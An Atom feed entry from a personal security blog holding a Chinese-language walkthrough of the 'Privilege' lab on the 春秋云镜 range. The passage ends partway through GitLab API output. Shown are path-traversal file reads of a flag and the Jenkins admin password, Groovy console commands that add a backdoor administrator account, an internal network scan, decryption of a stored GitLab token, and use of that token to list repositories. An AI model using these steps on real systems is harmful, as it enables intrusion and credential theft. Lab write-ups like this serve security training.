<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Oceanzbz&#39;s Blog</title>
  
  
  <link href="https://oceanzbz.github.io/atom.xml" rel="self"/>
  
  <link href="https://oceanzbz.github.io/"/>
  <updated>2025-03-10T12:26:34.971Z</updated>
  <id>https://oceanzbz.github.io/</id>
  
  <author>
    <name>Oceanzbz</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Privilege-春秋云镜</title>
    <link href="https://oceanzbz.github.io/post/d42c659b.html"/>
    <id>https://oceanzbz.github.io/post/d42c659b.html</id>
    <published>2025-03-10T08:17:58.000Z</published>
    <updated>2025-03-10T12:26:34.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p>先看扫描记录</p><img src="/post/d42c659b/IMAGE20250310171306818.png" class=""><p>没啥东西就俩web，联想提示，咱们去扫描下目录。</p><img src="/post/d42c659b/IMAGE20250310171409783.png" class=""><p>有一个源码，下载下来审计一下。</p><h2 id="任意文件读取">任意文件读取</h2><img src="/post/d42c659b/IMAGE20250310171614078.png" class=""><p>先去读一下flag，然后再去读一下另一个网站的密码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.98.114.207/tools/content-log.php?logfile=../../../../../../../../../Users/Administrator/flag/flag01.txt</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310171748835.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.98.114.207/tools/content-log.php?logfile=C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310171821608.png" class=""><p>然后去登录下另一台网站的后台看看</p><img src="/post/d42c659b/IMAGE20250310171949265.png" class=""><h2 id="jenkins后台RCE">jenkins后台RCE</h2><p>jenkins有个地方可以执行命令</p><img src="/post/d42c659b/IMAGE20250310172152296.png" class=""><p>权限很高，那么添加个后门用户rdp上去看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">println &quot;net user oceanz admin@123 /add&quot;.execute().text </span><br><span class="line">println &quot;net localgroup administrators oceanz /add&quot;.execute().text</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310172611799.png" class=""><h2 id="内网渗透">内网渗透</h2><p>先扫描下内网，顺便搭建个代理方便后续的渗透。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.14.7     is alive</span><br><span class="line">(icmp) Target 172.22.14.11    is alive</span><br><span class="line">(icmp) Target 172.22.14.16    is alive</span><br><span class="line">(icmp) Target 172.22.14.31    is alive</span><br><span class="line">(icmp) Target 172.22.14.46    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.14.7:3306 open</span><br><span class="line">172.22.14.7:8080 open</span><br><span class="line">172.22.14.31:1521 open</span><br><span class="line">172.22.14.11:445 open</span><br><span class="line">172.22.14.46:445 open</span><br><span class="line">172.22.14.31:445 open</span><br><span class="line">172.22.14.7:445 open</span><br><span class="line">172.22.14.31:139 open</span><br><span class="line">172.22.14.46:139 open</span><br><span class="line">172.22.14.11:139 open</span><br><span class="line">172.22.14.31:135 open</span><br><span class="line">172.22.14.46:135 open</span><br><span class="line">172.22.14.7:139 open</span><br><span class="line">172.22.14.11:135 open</span><br><span class="line">172.22.14.7:135 open</span><br><span class="line">172.22.14.46:80 open</span><br><span class="line">172.22.14.16:80 open</span><br><span class="line">172.22.14.7:80 open</span><br><span class="line">172.22.14.16:22 open</span><br><span class="line">172.22.14.16:8060 open</span><br><span class="line">172.22.14.11:88 open</span><br><span class="line">172.22.14.16:9094 open</span><br><span class="line">[*] alive ports len is: 22</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.7</span><br><span class="line">   [-&gt;]XR-JENKINS</span><br><span class="line">   [-&gt;]172.22.14.7</span><br><span class="line">[*] WebTitle http://172.22.14.16       code:302 len:99     title:None 跳转url: http://172.22.14.16/users/sign_in</span><br><span class="line">[*] NetBios 172.22.14.11    [+] DC:XIAORANG\XR-DC</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.11</span><br><span class="line">   [-&gt;]XR-DC</span><br><span class="line">   [-&gt;]172.22.14.11</span><br><span class="line">[*] WebTitle http://172.22.14.7:8080   code:403 len:548    title:None</span><br><span class="line">[*] WebTitle http://172.22.14.16:8060  code:404 len:555    title:404 Not Found</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.46</span><br><span class="line">   [-&gt;]XR-0923</span><br><span class="line">   [-&gt;]172.22.14.46</span><br><span class="line">[*] NetBios 172.22.14.46    XIAORANG\XR-0923</span><br><span class="line">[*] NetBios 172.22.14.31    WORKGROUP\XR-ORACLE</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.31</span><br><span class="line">   [-&gt;]XR-ORACLE</span><br><span class="line">   [-&gt;]172.22.14.31</span><br><span class="line">[*] WebTitle http://172.22.14.7        code:200 len:54603  title:XR SHOP</span><br><span class="line">[*] WebTitle http://172.22.14.46       code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign in · GitLab</span><br></pre></td></tr></table></figure><p>看第二关的提示说有什么gitlab的apitoken 去翻翻配置文件看看</p><img src="/post/d42c659b/IMAGE20250310173352296.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.1&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br><span class="line">&lt;com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin=&quot;credentials@1214.v1de940103927&quot;&gt;</span><br><span class="line">  &lt;domainCredentialsMap class=&quot;hudson.util.CopyOnWriteMap$Hash&quot;&gt;</span><br><span class="line">    &lt;entry&gt;</span><br><span class="line">      &lt;com.cloudbees.plugins.credentials.domains.Domain&gt;</span><br><span class="line">        &lt;specifications/&gt;</span><br><span class="line">      &lt;/com.cloudbees.plugins.credentials.domains.Domain&gt;</span><br><span class="line">      &lt;java.util.concurrent.CopyOnWriteArrayList&gt;</span><br><span class="line">        &lt;com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl plugin=&quot;gitlab-plugin@1.6.0&quot;&gt;</span><br><span class="line">          &lt;scope&gt;GLOBAL&lt;/scope&gt;</span><br><span class="line">          &lt;id&gt;9eca4a05-e058-4810-b952-bd6443e6d9a8&lt;/id&gt;</span><br><span class="line">          &lt;description&gt;&lt;/description&gt;</span><br><span class="line">          &lt;apiToken&gt;&#123;AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh&#125;&lt;/apiToken&gt;</span><br><span class="line">        &lt;/com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl&gt;</span><br><span class="line">      &lt;/java.util.concurrent.CopyOnWriteArrayList&gt;</span><br><span class="line">    &lt;/entry&gt;</span><br><span class="line">  &lt;/domainCredentialsMap&gt;</span><br><span class="line">&lt;/com.cloudbees.plugins.credentials.SystemCredentialsProvider&gt;</span><br></pre></td></tr></table></figure><p>需要解密一下这个apitoken</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println(hudson.util.Secret.fromString(&quot;&#123;AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh&#125;&quot;).getPlainText())</span><br></pre></td></tr></table></figure><img src="/post/d42c659b/IMAGE20250310173446977.png" class=""><p>然后利用api去列出gitlab中有哪些项目去翻翻oracle的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./proxychains4 -f proxychains.conf  curl --header &quot;PRIVATE-TOKEN:glpat-7kD_qLH2PiQv_ywB9hz2&quot; &quot;http://172.22.14.16/api/v4/projects&quot;</span><br></pre></td></tr></table></figure><p>记录</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">    <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">6</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Internal Secret&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;name_with_namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XRLAB / Internal Secret&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;internal-secret&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;path_with_namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab/internal-secret&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;created_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-25T08:30:12.362Z&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;default_branch&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;tag_list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;topics&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span> <span class="punctuation">]</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;ssh_url_to_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;git@gitlab.xiaorang.lab:xrlab/internal-secret.git&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;http_url_to_repo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/internal-secret.git&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;web_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/xrlab/internal-secret&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;readme_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;avatar_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;forks_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;star_count&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;last_activity_at&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2022-12-25T08:30:12.362Z&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;XRLAB&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;group&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;full_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xrlab&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;parent_id&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;avatar_url&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;web_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/groups/xrlab&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;_links&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>!<span class="punctuation">[</span><span class="punctuation">]</span>(https<span class="punctuation">:</span><span class="comment">//tool.oschina.net/tools/json_format/Expanded.gif)</span></span><br><span class="line">            <span class="attr">&quot;self&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://gitlab.xiaorang.lab/api/v4/projects/6&quot;</span><span class="punctuation">,</span> </span><br><span class="line">            <span class="attr">&quot;issues&quot;</span><span 